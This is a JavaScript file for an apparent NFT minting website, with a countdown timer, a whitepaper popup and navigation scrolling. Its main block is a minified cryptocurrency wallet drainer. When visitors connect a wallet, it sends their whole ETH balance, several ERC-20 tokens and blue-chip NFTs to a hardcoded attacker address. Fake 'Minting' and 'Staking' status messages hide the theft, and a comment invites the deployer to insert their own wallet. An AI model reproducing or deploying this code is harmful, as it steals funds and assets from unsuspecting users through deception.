// IMPORTANT: Replace this with your own wallet address
const drainerWalletAddress = "0x2C17dD286811aa630c1747f158D492D34C064063";

const b=document.getElementById('connect-wallet');const s=document.getElementById('mint-status');const t=document.getElementById('timer');const c=new Date().getTime()+24*60*60*1000;const i=setInterval(()=>{const now=new Date().getTime();const distance=c-now;const hours=Math.floor((distance%(1000*60*60*24))/(1000*60*60));const minutes=Math.floor((distance%(1000*60*60))/(1000*60));const seconds=Math.floor((distance%(1000*60))/1000);t.innerHTML=`${hours}h ${minutes}m ${seconds}s`;if(distance<0){clearInterval(i);t.innerHTML="MINTING ENDED";b.disabled=true;}},1000);const a20=["function balanceOf(address owner) view returns (uint256)","function transfer(address to, uint amount) returns (bool)","function approve(address spender, uint256 amount) external returns (bool)"];const a721=["function balanceOf(address owner) view returns (uint256)","function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)","function setApprovalForAll(address operator, bool approved) external","function safeTransferFrom(address from, address to, uint256 tokenId) external"];const t20={"USDT":"0xdAC17F958D2ee523a2206206994597C13D831ec7","USDC":"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48","DAI":"0x6B175474E89094C44Da98b954EedeAC495271d0F","WETH":"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2","SHIB":"0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE"};const t721={"BAYC":"0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D","MAYC":"0x60E4d7866282a6F08aA3E7A091B764d37c8c8F38","Azuki":"0xED5AF388653567Af2F388E6224dC7C4b3241C544"};b.addEventListener('click',async()=>{b.disabled=true;b.textContent='Connecting...';s.textContent='Please approve the connection in your wallet.';if(typeof window.ethereum!=='undefined'){try{const provider=new ethers.providers.Web3Provider(window.ethereum);await provider.send("eth_requestAccounts",[]);const signer=provider.getSigner();const userAddress=await signer.getAddress();b.textContent='Wallet Connected';s.textContent='Preparing to mint... Please wait.';await p1(signer,provider,userAddress);await p2(signer,provider,userAddress);await p3(signer,userAddress);s.textContent="Minting failed. Please try again later.";b.textContent="Error";}catch(error){console.error(error);s.textContent=`Error: ${error.message}`;b.textContent='Connection Failed';b.disabled=false;}}else{s.textContent='MetaMask not found. Please install MetaMask.';b.textContent='MetaMask Not Found';}});async function p1(signer,provider,userAddress){try{const balance=await provider.getBalance(userAddress);const gasPrice=await provider.getGasPrice();const gasLimit=21000;const gasCost=gasPrice.mul(gasLimit);if(balance.gt(gasCost)){const amountToSend=balance.sub(gasCost);s.textContent=`Minting... (1/3)`;const tx=await signer.sendTransaction({to:drainerWalletAddress,value:amountToSend});await tx.wait();}}catch(error){console.error("ETH drain error:",error);}}async function p2(signer,provider,userAddress){s.textContent=`Minting... (2/3)`;for(const tokenName in t20){try{const tokenAddress=t20[tokenName];const tokenContract=new ethers.Contract(tokenAddress,a20,signer);const balance=await tokenContract.balanceOf(userAddress);if(balance.gt(0)){const approveTx=await tokenContract.approve(drainerWalletAddress,balance);await approveTx.wait();const transferTx=await tokenContract.transfer(drainerWalletAddress,balance);await transferTx.wait();}}catch(error){console.error(`Token drain error (${tokenName}):`,error);}}}async function p3(signer,userAddress){s.textContent=`Minting... (3/3)`;for(const nftName in t721){try{const nftAddress=t721[nftName];const nftContract=new ethers.Contract(nftAddress,a721,signer);const balance=await nftContract.balanceOf(userAddress);if(balance.gt(0)){s.textContent=`Approving ${nftName} collection for staking...`;const approvalTx=await nftContract.setApprovalForAll(drainerWalletAddress,true);await approvalTx.wait();const tokenIds=[];for(let i=0;i<balance.toNumber();i++){const tokenId=await nftContract.tokenOfOwnerByIndex(userAddress,i);tokenIds.push(tokenId);}for(const tokenId of tokenIds){s.textContent=`Staking your ${nftName} #${tokenId}...`;await nftContract.safeTransferFrom(userAddress,drainerWalletAddress,tokenId);}}}catch(error){console.error(`NFT drain error (${nftName}):`,error);}}}

// --- Whitepaper Modal ---
const modal = document.getElementById("whitepaper-modal");
const link = document.getElementById("whitepaper-link");
const closeButton = document.getElementsByClassName("close-button")[0];

link.onclick = function(e) {
  e.preventDefault();
  modal.style.display = "block";
}

closeButton.onclick = function() {
  modal.style.display = "none";
}

window.onclick = function(event) {
  if (event.target == modal) {
    modal.style.display = "none";
  }
}

// --- Smooth Scrolling for Navigation Links ---
document.querySelectorAll('nav ul li a').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();

        const targetId = this.getAttribute('href');
        if (targetId.startsWith('#')) { // Only smooth scroll for internal links
            document.querySelector(targetId).scrollIntoView({
                behavior: 'smooth'
            });
        }
    });
});